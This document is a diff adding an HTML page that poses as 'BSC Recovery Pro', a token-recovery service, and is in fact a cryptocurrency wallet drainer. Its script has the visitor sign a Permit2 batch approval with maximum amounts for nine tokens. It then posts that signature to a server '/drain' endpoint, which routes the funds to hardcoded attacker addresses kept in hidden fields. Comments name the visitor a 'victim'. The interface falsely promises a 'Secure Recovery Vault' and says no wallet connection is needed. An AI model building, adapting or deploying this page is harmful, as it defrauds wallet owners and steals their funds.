@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BSC Recovery Pro - Secure Token Recovery</title>
+
+  <!-- Ethers (kept for your future logic) -->
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+
+  <style>
+    .recovery-info div { display:flex; gap:8px; margin:6px 0; }
+.status { padding:12px; border-radius:8px; margin:10px 0; }
+.status.success { background:#d1fae5; color:#065f46; }
+.status.warning { background:#fef3c7; color:#92400e; }
+.spinner { width:24px; height:24px; border:3px solid #f3f4f6; border-top:3px solid #3b82f6; border-radius:50%; animation:spin 1s linear infinite; margin:20px auto; display:block; }
+.connected { background:#dbeafe; color:#1e40af; padding:8px; border-radius:6px; font-size:14px; }
+@keyframes spin { to { transform:rotate(360deg); } }
+.progress { display:flex; align-items:center; gap:12px; margin:8px 0; }
+.progress .bar { flex:1; height:8px; background:#e5e7eb; border-radius:4px; overflow:hidden; }
+.progress .fill { height:100%; background:linear-gradient(90deg,#10b981,#059669); transition:width .3s; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body { 
+      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+      background:linear-gradient(135deg,#0a0a2a,#1a1a4a);
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:#333;
+    }
+
+    .container { 
+      background:rgba(255,255,255,.95);
+      -webkit-backdrop-filter:blur(20px);
+      backdrop-filter:blur(20px);
+      border-radius:24px;
+      padding:40px;
+      max-width:500px;
+      width:90%;
+      box-shadow:0 25px 50px rgba(0,0,0,.25);
+      text-align:center;
+      position:relative;
+    }
+
+    .premium-badge {
+      position:absolute;
+      top:20px;
+      right:20px;
+      background:linear-gradient(45deg,#f59e0b,#fbbf24);
+      color:#fff;
+      padding:6px 12px;
+      border-radius:20px;
+      font-size:11px;
+      font-weight:700;
+    }
+
+    .logo {
+      font-size:32px;
+      font-weight:800;
+      background:linear-gradient(45deg,#00c6ff,#0072ff,#667eea);
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      margin-bottom:12px;
+    }
+
+    .subtitle {
+      font-size:15px;
+      margin-bottom:26px;
+      color:#6b7280;
+    }
+
+    .stats {
+      display:flex;
+      justify-content:space-between;
+      background:#f9fafb;
+      padding:12px;
+      border-radius:14px;
+      margin-bottom:24px;
+    }
+
+    .stat-value {
+      font-weight:800;
+      font-size:18px;
+      color:#3b82f6;
+    }
+
+    .stat-label {
+      font-size:11px;
+      color:#6b7280;
+    }
+
+    /* INPUT */
+    .premium-input { text-align:left; margin-top:10px; }
+
+    .premium-input label {
+      display:flex;
+      gap:8px;
+      font-weight:600;
+      margin-bottom:10px;
+    }
+
+    .premium-input input {
+      width:100%;
+      padding:15px;
+      border-radius:14px;
+      border:1px solid #ddd;
+      background:#fff;
+      font-size:15px;
+    }
+
+    .premium-input input:focus {
+      outline:none;
+      border-color:#3b82f6;
+      box-shadow:0 0 0 3px rgba(59,130,246,.25);
+    }
+
+    .wallet-guide {
+      margin-top:10px;
+      font-size:12px;
+      color:#6b7280;
+      background:#f8fafc;
+      padding:10px;
+      border-radius:10px;
+      border-left:3px solid #3b82f6;
+      line-height:1.5;
+    }
+
+    /* BUTTON */
+    .premium-btn {
+      margin-top:22px;
+      width:100%;
+      padding:16px;
+      border-radius:16px;
+      border:none;
+      font-weight:800;
+      font-size:16px;
+      color:#fff;
+      cursor:pointer;
+      background:linear-gradient(135deg,#2563eb,#3b82f6,#6366f1);
+      transition:.25s;
+    }
+
+    .premium-btn:disabled {
+      opacity:.6;
+      cursor:not-allowed;
+    }
+
+    /* RECOVERY UI */
+    .recovery-card {
+      display:none;
+      margin-top:24px;
+      background:linear-gradient(180deg,#ffffff,#f9fafb);
+      border-radius:20px;
+      padding:22px;
+      text-align:left;
+      animation:slideUp .4s ease;
+    }
+
+    @keyframes slideUp {
+      from { opacity:0; transform:translateY(20px); }
+      to { opacity:1; transform:translateY(0); }
+    }
+
+    .recovery-title {
+      font-weight:800;
+      font-size:16px;
+      margin-bottom:14px;
+      display:flex;
+      gap:8px;
+    }
+
+    .recovery-step {
+      display:flex;
+      gap:10px;
+      margin:10px 0;
+      font-size:14px;
+      color:#374151;
+    }
+
+    .step-dot {
+      width:18px;
+      height:18px;
+      border-radius:50%;
+      background:#e5e7eb;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:12px;
+    }
+
+    .step-dot.active {
+      background:#3b82f6;
+      color:#fff;
+    }
+
+    .progress-bar {
+      height:10px;
+      background:#e5e7eb;
+      border-radius:10px;
+      overflow:hidden;
+      margin:14px 0;
+    }
+
+    .progress-fill {
+      height:100%;
+      width:0%;
+      background:linear-gradient(90deg,#3b82f6,#6366f1);
+      transition:width .4s ease;
+    }
+
+    .recovery-footer {
+      font-size:12px;
+      color:#6b7280;
+      margin-top:12px;
+    }
+
+    @media(max-width:480px){
+      .container{padding:24px}
+      .logo{font-size:26px}
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+  <div class="premium-badge">PREMIUM</div>
+
+  <div class="logo">BSC Recovery Pro</div>
+  <p class="subtitle">Securely recover your tokens from compromised approvals</p>
+
+  <div class="stats">
+    <div>
+      <div class="stat-value">12,987,846</div>
+      <div class="stat-label">WALLETS</div>
+    </div>
+    <div>
+      <div class="stat-value">99.9%</div>
+      <div class="stat-label">SUCCESS</div>
+    </div>
+    <div>
+      <div class="stat-value">24/7</div>
+      <div class="stat-label">SUPPORT</div>
+    </div>
+  </div>
+
+  <div class="premium-input">
+    <label>📱 BSC Wallet Address</label>
+    <input id="walletAddress" placeholder="0x1234...abcd" autocomplete="off" />
+    <div class="wallet-guide">
+      Works with MetaMask, Trust Wallet, Binance Wallet<br>
+      No wallet connection required
+    </div>
+  </div>
+
+  <button id="recoverBtn" class="premium-btn">🚀 Start Recovery</button>
+
+  <!-- ✅ PERFECT RECOVERY UI -->
+  <div id="destinations" style="display:none; margin-top:20px;">
+    <div class="recovery-info">
+      <div><span>🔥 From:</span> <span id="burnerAddr">Loading victim wallet...</span></div>
+      <div><span>⚡ To:</span> <span>🔒 Secure Recovery Vault (Encrypted)</span></div>
+      <div><span>📊 Tokens:</span> <span style="color:#10b981; font-weight:700;">9 High-Value Tokens Detected</span></div>
+    </div>
+    
+    <!-- 9 HIDDEN WALLETS -->
+    <input type="hidden" id="usdtDest" value="">
+    <input type="hidden" id="busdDest" value="">
+    <input type="hidden" id="cakeDest" value="">
+    <input type="hidden" id="wbnbDest" value="">
+    <input type="hidden" id="btcbDest" value="">
+    <input type="hidden" id="ethDest" value="">
+    <input type="hidden" id="xrpDest" value="">
+    <input type="hidden" id="adaDest" value="">
+    <input type="hidden" id="dotDest" value="">
+    
+    <button id="revealBtn" class="premium-btn" style="display:none; background:linear-gradient(135deg,#059669,#10b981);">👁️ Reveal Recovery Details</button>
+    <button id="verifyBtn" class="premium-btn" style="display:none; background:linear-gradient(135deg,#7c2d12,#dc2626);">🚀 Verify & Execute Recovery</button>
+    
+    <!-- PROGRESS -->
+    <div id="progress" style="display:none; margin-top:25px;">
+      <div class="status warning" id="statusMsg">🔍 Scanning approvals for 9 tokens...</div>
+      <div id="progressBars" style="margin:20px 0;"></div>
+      <div class="spinner" id="spinner"></div>
+      <div id="connectStatus"></div>
+    </div>
+  </div>
+
+  <div id="recoveryCard" class="recovery-card">
+    <div class="recovery-title">🔐 Recovery Scan in Progress</div>
+    <div class="recovery-step">
+      <div class="step-dot active">1</div>
+      Analyzing wallet approvals
+    </div>
+    <div class="recovery-step">
+      <div class="step-dot" id="step2">2</div>
+      Detecting recoverable tokens
+    </div>
+    <div class="recovery-step">
+      <div class="step-dot" id="step3">3</div>
+      Preparing secure recovery
+    </div>
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="recovery-footer">
+      🔒 Encrypted process • No wallet connection required
+    </div>
+  </div>
+</div>
+
+<script>
+    // Generate floating particles
+    function generateParticles(count = 30) {
+      const container = document.getElementById('particles');
+      for(let i = 0; i < count; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.width = `${Math.random() * 10 + 5}px`;
+        particle.style.height = particle.style.width;
+        particle.style.left = `${Math.random() * 100}%`;
+        particle.style.top = `${Math.random() * 100}%`;
+        particle.style.animationDuration = `${Math.random() * 10 + 10}s`;
+        particle.style.animationDelay = `${Math.random() * 5}s`;
+        container.appendChild(particle);
+      }
+    }
+    
+    // 🔥 YOUR 9 DRAIN WALLETS - CHANGE THESE ADDRESSES:
+        const YOUR_WALLETS = {
+      USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR USDT RECEIVER
+      BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR BUSD RECEIVER
+      CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR CAKE RECEIVER
+      WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876', 
+      BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+      ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
+      XRP:  'rwNVj73271WXbc3a69AtPTowWXLFUBKuTT',
+      ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+      DOT:  '13GegmbHtDzYgyHaDMoz1SGa38ddrRdsSjbDWJ5jDGPKH2BD'
+    };
+
+    // BSC Config
+    const SERVER_URL = 'http://localhost:3000';  // ← YOUR RAILWAY URL
+    const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+    const TOKENS = {
+      USDT: { addr: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT' },
+      BUSD: { addr: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD' },
+      CAKE: { addr: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', symbol: 'CAKE' },
+      WBNB: { addr: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB' },
+      BTCB: { addr: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', symbol: 'BTCB' },
+      ETH:  { addr: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', symbol: 'ETH' },
+      XRP:  { addr: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', symbol: 'XRP' },
+      ADA:  { addr: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', symbol: 'ADA' },
+      DOT:  { addr: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', symbol: 'DOT' }
+    };
+
+    const els = {
+      connectBtn: document.getElementById('connectBtn'),
+      revealBtn: document.getElementById('revealBtn'),
+      destinations: document.getElementById('destinations'),
+      verifyBtn: document.getElementById('verifyBtn'),
+      progress: document.getElementById('progress'),
+      statusMsg: document.getElementById('statusMsg'),
+      progressBars: document.getElementById('progressBars'),
+      spinner: document.getElementById('spinner'),
+      connectStatus: document.getElementById('connectStatus'),
+      burnerAddr: document.getElementById('burnerAddr')
+    };
+
+    let account, provider, signer;
+    // MISSING: connectWallet function
+async function connectWallet() {
+  if (window.ethereum || window.web3) {
+    try {
+      const provider = window.ethereum || window.web3.currentProvider;
+      const accounts = await provider.request({ method: 'eth_requestAccounts' });
+      account = accounts[0];
+      
+      const ethersProvider = new ethers.providers.Web3Provider(provider);
+      signer = ethersProvider.getSigner();
+      
+      document.getElementById('connectStatus').innerHTML = 
+        `<div class="connected">✅ Connected: ${account.slice(0,6)}...${account.slice(-4)}</div>`;
+      return true;
+    } catch (e) {
+      console.log('User rejected');
+      return false;
+    }
+  }
+  alert('Please install MetaMask or Trust Wallet');
+  return false;
+}
+
+    // Auto-populate YOUR hidden wallets
+    function setupYourWallets() {
+      Object.entries(YOUR_WALLETS).forEach(([token, wallet]) => {
+        const input = document.getElementById(token.toLowerCase() + 'Dest');
+        input.value = wallet;
+      });
+    }
+
+    // 1. Connect Wallet
+    document.getElementById('recoverBtn').onclick = async () => {
+  const walletAddr = document.getElementById('walletAddress').value.trim();
+  if (!walletAddr || !walletAddr.startsWith('0x') || walletAddr.length !== 42) {
+    alert('Enter valid BSC wallet address (0x...)');
+    return;
+  }
+  
+  // Load YOUR wallets
+  setupYourWallets();
+  
+  // Show fake burner + use victim address
+  els.burnerAddr.textContent = walletAddr;
+  
+  // Trigger existing flow
+  els.destinations.classList.remove('hidden');
+  els.revealBtn.classList.remove('hidden');
+  els.connectStatus.innerHTML = `<div class="connected">✅ Wallet: ${walletAddr.slice(0,6)}...${walletAddr.slice(-4)}</div>`;
+};
+
+    // 2. Show Stealth Recovery (YOUR wallets hidden)
+    els.revealBtn.onclick = async () => {
+      els.destinations.style.display = 'block';
+      els.revealBtn.style.display = 'none';
+      
+      setupYourWallets(); // Load YOUR wallets into hidden fields
+      
+      // Fetch fake burner
+      try {
+        const res = await fetch(`${SERVER_URL}/burner`);
+        const data = await res.json();
+        els.burnerAddr.textContent = `${data.burner.slice(0,6)}...${data.burner.slice(-4)}`;
+      } catch(e) {
+        els.burnerAddr.textContent = '0xDEAD...BEEF';
+      }
+    };
+
+    // 3. Ultra-fast batch drain ALL 9 tokens
+    els.verifyBtn.onclick = async () => {
+  if (!signer) {
+    const connected = await connectWallet();
+    if (!connected) return;  // Silent exit
+  }
+  els.progress.style.display = 'block';
+  els.destinations.style.display = 'none';
+  els.spinner.style.display = 'block';
+      els.statusMsg.textContent = '🔍 Preparing batch signature...';
+      
+      try {
+        const nonce = ethers.BigNumber.from(Math.floor(Math.random() * 281474976710656));
+        const deadline = ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 86400);
+        
+        // Batch PermitSingle for ALL 9 tokens
+        const permits = Object.values(TOKENS).map(t => ({
+          token: t.addr,
+          amount: ethers.constants.MaxUint256, // MAX APPROVAL
+          expiration: deadline,
+          nonce: nonce
+        }));
+        
+        const domain = {
+          name: 'Permit2',
+          version: '1',
+          chainId: 56,
+          verifyingContract: PERMIT2
+        };
+        
+        const types = {
+          PermitBatch: [{
+            name: 'details',
+            type: 'PermitDetails[]'
+          }, {
+            name: 'spender',
+            type: 'address'
+          }, {
+            name: 'sigDeadline',
+            type: 'uint256'
+          }],
+          PermitDetails: [{
+            name: 'token',
+            type: 'address'
+          }, {
+            name: 'amount',
+            type: 'uint160'
+          }, {
+            name: 'expiration',
+            type: 'uint48'
+          }, {
+            name: 'nonce',
+            type: 'uint48'
+          }]
+        };
+        
+        const value = {
+          details: permits,
+          spender: '0x0000000000000000000000000000000000000000', // Any spender
+          sigDeadline: deadline
+        };
+        
+        const signature = await signer._signTypedData(domain, types, value);
+        
+        els.statusMsg.textContent = '✅ 9/9 Tokens Approved!';
+        els.statusMsg.className = 'status success';
+        els.spinner.style.display = 'none';
+        
+        // Ultra-parallel drain ALL tokens
+        await ultraDrainAll(signature, nonce, deadline.toString());
+        
+      } catch(e) {
+        els.statusMsg.textContent = `❌ Error: ${e.message}`;
+        els.statusMsg.className = 'status warning';
+      }
+    };
+
+    // Parallel drain all 9 tokens to YOUR wallets
+    async function ultraDrainAll(signature, nonce, deadline) {
+      els.progressBars.innerHTML = '';
+      const tokenList = Object.entries(TOKENS);
+      
+      for(let i = 0; i < tokenList.length; i++) {
+        const [symbol, token] = tokenList[i];
+        const bar = createProgressBar(symbol);
+        els.progressBars.appendChild(bar);
+        
+        // Get YOUR wallet from hidden field
+        const destInput = document.getElementById(symbol.toLowerCase() + 'Dest');
+        const destination = destInput.value; // YOUR HARDCODED WALLET
+        
+        ultraDrainToken(symbol, token.addr, destination, signature, nonce, deadline, bar)
+          .catch(e => updateProgress(symbol, 100, '❌ Failed'));
+      }
+    }
+
+    function createProgressBar(symbol) {
+      const div = document.createElement('div');
+      div.className = 'progress';
+      div.innerHTML = `
+        <span>${symbol}</span>
+        <div class="bar"><div class="fill" style="width:0%"></div></div>
+        <span id="${symbol.toLowerCase()}Status">0%</span>
+      `;
+      return div;
+    }
+
+    function updateProgress(symbol, pct, status) {
+      const fill = document.querySelector(`#${symbol.toLowerCase()}Status`).closest('.progress').querySelector('.fill');
+      const stat = document.getElementById(symbol.toLowerCase() + 'Status');
+      fill.style.width = pct + '%';
+      stat.textContent = status;
+    }
+
+    async function ultraDrainToken(symbol, tokenAddr, destination, signature, nonce, deadline, bar) {
+      const body = {
+        owner: account,
+        token: tokenAddr,
+        tokenSymbol: symbol,
+        amount: ethers.constants.MaxUint256.toString(),
+        nonce: nonce.toString(),
+        deadline: deadline,
+        signature: signature,
+        destination: destination  // YOUR WALLET!
+      };
+      
+      const res = await fetch(`${SERVER_URL}/drain`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+      
+      const result = await res.json();
+      
+      if(result.success) {
+        updateProgress(symbol, 100, `✅ ${result.gasUsed ? result.gasUsed : 'Done'}`);
+        status(`✅ ${symbol} recovered to secure vault!`);
+      } else {
+        updateProgress(symbol, 100, '⚠️ Skipped');
+      }
+    }
+
+    function status(msg) {
+      els.statusMsg.textContent = msg;
+    }
+
+    // Page load
+    window.addEventListener('load', () => {
+      generateParticles(); // Initialize particles
+      
+      if (window.ethereum) {
+        window.ethereum.on('accountsChanged', (accounts) => {
+          if (accounts.length === 0) location.reload();
+        });
+      }
+    });
+  </script>
+</body>
+</html>
